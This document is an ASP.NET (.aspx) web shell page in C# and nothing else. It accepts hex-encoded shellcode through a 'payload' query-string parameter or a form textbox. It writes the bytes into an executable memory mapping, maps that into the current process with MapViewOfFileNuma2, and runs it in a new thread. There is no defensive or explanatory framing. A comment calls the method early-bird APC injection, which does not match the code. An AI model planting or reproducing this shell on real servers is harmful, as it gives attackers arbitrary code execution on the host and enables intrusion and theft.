<%@ Page Language="C#" AutoEventWireup="true"%>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Runtime.ConstrainedExecution" %>
<%@ Import Namespace="System.Security" %>

<script runat="server">

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFileMapping(IntPtr hFile,
        IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh,
        uint dwMaximumSizeLow, string lpName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject,
       uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow,
       uint dwNumberOfBytesToMap);
    [DllImport("kernelbase.dll", SetLastError = true)]
    public static extern IntPtr MapViewOfFileNuma2(
        IntPtr FileMappingHandle,
        IntPtr ProcessHandle,
        UInt64 Offset,
        IntPtr BaseAddress,
        int ViewSize,
        UInt32 AllocationType,
        UInt32 PageProtection,
        UInt32 Numa);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
              uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
    UInt32 dwMilliseconds);

    public class Injector
    {
        public static void Run(string payload)
        {
            IntPtr hProcess = IntPtr.Zero;

            byte[] buf = hexToBytes(payload);
            hProcess = Process.GetCurrentProcess().Handle;

            RemoteMapInject(hProcess, buf);
        }

        private static byte[] hexToBytes(string hex)
        {
            int size = hex.Length / 2;
            byte[] buf = new byte[size];

            for (int i = 0; i < size; i++)
            {
                buf[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }

            return buf;
        }

        // apc injection early bird
        private static void RemoteMapInject(IntPtr hProcess, byte[] buf)
        {
            bool bState = false;
            IntPtr hFile = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            IntPtr pMapLocalAddress = IntPtr.Zero;
            IntPtr pMapRemoteAddress = IntPtr.Zero;
            hFile = CreateFileMapping(IntPtr.Zero, IntPtr.Zero, 0x40, 0, (uint)buf.Length, null);
            if (hFile == IntPtr.Zero)
            {
                Console.WriteLine("[!] CreateFileMapping failed with error: {0}", Marshal.GetLastWin32Error());
                goto _CLEANUP;
            }

            pMapLocalAddress = MapViewOfFile(hFile, 0x0002, 0, 0, (uint)buf.Length);
            if (pMapLocalAddress == IntPtr.Zero)
            {
                Console.WriteLine("[!] MapViewOfFile failed with error: {0}", Marshal.GetLastWin32Error());
                goto _CLEANUP;
            }

            Marshal.Copy(buf, 0, pMapLocalAddress, buf.Length);


            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] GetCurrentProcess failed with error: {0}", Marshal.GetLastWin32Error());
                goto _CLEANUP;
            }
            pMapRemoteAddress = MapViewOfFileNuma2(hFile, hProcess, 0, IntPtr.Zero, 0, 0, 0x20, 0xffffffff);
            if (pMapRemoteAddress == IntPtr.Zero)
            {
                Console.WriteLine("[!] MapViewOfFileNuma2 failed with error: {0}", Marshal.GetLastWin32Error());
                goto _CLEANUP;
            }
            Console.WriteLine("[+] Remote Mapping Address : 0x{0}", pMapRemoteAddress);

            hThread = CreateThread(IntPtr.Zero, 0, pMapRemoteAddress, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[!] CreateThread failed with error: {0}", Marshal.GetLastWin32Error());
                goto _CLEANUP;
            }
            WaitForSingleObject(hThread, 0xffffffff);
            bState = true;
        _CLEANUP:
            if (hFile != IntPtr.Zero)
            {
                CloseHandle(hFile);
            }

            if (hProcess != IntPtr.Zero)
            {
                CloseHandle(hProcess);
            }
            if (hThread != IntPtr.Zero)
            {
                CloseHandle(hThread);
            }

        }
    }
    void Page_Load(object sender, EventArgs e)
    {
        if (Request.QueryString["payload"] != null)
        {
            string payload = Request.QueryString["payload"].ToString();
            Injector.Run(payload);
        }
        
    }

    void Click_Shellcode(object sender, EventArgs e)
    {
        string payload = shellcode.Text;
        Injector.Run(payload);
    }

</script>


<html>
    <body>
        <form id="cmd" method="post" runat="server">
            <asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Shellcode</asp:Label>
            <asp:TextBox id="shellcode" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
            <asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="Run" OnClick="Click_Shellcode"></asp:Button>
        </form>
    </body>

</html>
